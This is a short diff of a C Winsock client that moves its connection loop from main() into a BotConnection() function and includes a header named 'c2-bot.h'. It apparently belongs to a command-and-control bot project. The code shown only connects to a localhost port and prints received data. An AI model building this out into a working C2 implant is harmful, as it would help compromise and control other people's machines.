@@ -3,13 +3,15 @@
 #include <stdio.h>
 #include <winsock2.h>
 
+#include "c2-bot.h"
+
 #pragma comment(lib, "ws2_32.lib")
 
 #define SERVER_IP "127.0.0.1"
 #define SERVER_PORT 12345
 #define BUFFER_SIZE 4096
 
-int main() {
+void BotConnection() {
     WSADATA wsaData;
     SOCKET sock;
 
@@ -18,15 +20,14 @@ int main() {
     int bytes_received;
 
     if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
-        printf("Failed initial Winsock. Code: %d\n", WSAGetLastError());
-        return 1;
+        return;
     }
 
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == INVALID_SOCKET) {
         printf("Error creating socket. Code: %d\n", WSAGetLastError());
         WSACleanup();
-        return 1;
+        return;
     }
 
     server.sin_family = AF_INET;
@@ -37,7 +38,7 @@ int main() {
         printf("Failed to connect -> server. Code %d\n", WSAGetLastError());
         closesocket(sock);
         WSACleanup();
-        return 1;
+        return;
     }
 
     printf("Connect to server %s:%d success!\n", SERVER_IP, SERVER_PORT);
@@ -51,7 +52,7 @@ int main() {
         if (bytes_received < 0) {
             perror("Failed to get bytes data");
             closesocket(sock);
-            return 1;
+            break;
         }
 
         buffer[bytes_received] = '\0';
@@ -60,5 +61,4 @@ int main() {
 
     closesocket(sock);
     WSACleanup();
-    return 0;
 }
